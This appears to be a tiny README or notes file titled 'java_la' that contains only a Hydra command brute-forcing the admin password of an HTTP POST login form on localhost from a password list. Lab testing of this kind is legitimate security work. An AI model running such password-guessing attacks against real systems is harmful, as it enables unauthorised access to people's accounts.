# java_la



hydra -l admin -P passwords.txt 127.0.0.1 http-post-form \
"/login:username=^USER^&password=^PASS^:F=Invalid password"